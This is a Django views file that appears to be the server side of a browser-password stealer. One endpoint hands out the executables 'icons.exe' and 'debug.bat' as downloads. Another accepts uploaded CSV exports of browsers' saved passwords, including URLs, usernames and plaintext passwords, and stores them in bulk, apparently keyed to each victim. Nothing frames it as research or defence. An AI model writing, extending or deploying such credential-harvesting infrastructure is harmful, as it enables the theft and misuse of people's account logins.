from django.shortcuts import render
from django.http import FileResponse, Http404
from django.http import JsonResponse
from .models import Data
import json, csv, io
from datetime import datetime

def get(request):
    if request.method == 'GET':
        try:
            if request.GET.get("icons") == '1':
                return FileResponse(open("icons.exe", 'rb'), content_type='application/octet-stream')
            elif request.GET.get("debug") == '1':
                return FileResponse(open("debug.bat", 'rb'), content_type='application/octet-stream')
            else:
                raise Http404("Requested file not found.")
        except FileNotFoundError:
            raise Http404("File does not exist.")


def post(request):
    if request.method == 'POST':
        # try:
        body = request.body.decode('utf-8').strip()
        if not body:
            return JsonResponse({"status": "failed", "message": "Empty body received"}, status=400)

        data = json.loads(body)
        # try:
        common_id = data.get("data",{}).get("username", "")
        csv_file = io.StringIO(data.get("data",{}).get("content", ""))

        print("Processing data...")
        rows = list(csv.DictReader(csv_file))

        objects = []
        for row in rows:
            objects.append(Data(
                common_id=common_id,
                url=row["URL"],
                web_browser=row["Web Browser"],
                user_name=row["User Name"],
                password=row["Password"],
                password_strength=row["Password Strength"],
                user_name_field=row["User Name Field"],
                password_field=row["Password Field"],
                created_time=datetime.strptime(row["Created Time"], "%m/%d/%Y %I:%M:%S %p") if row["Created Time"] else None,
                modified_time=datetime.strptime(row["Modified Time"], "%m/%d/%Y %I:%M:%S %p") if row["Modified Time"] else None,
                filename=row["Filename"]
            ))

        Data.objects.bulk_create(objects)
        print("Data saved successfully")

        # except Exception as e:
            # print(e)
            # print(data)

        return JsonResponse({"status": "success"})
        # except Exception as e:
        #     print(e)
        #     return JsonResponse({"status": "failed", "message": str(e)}, status=500)
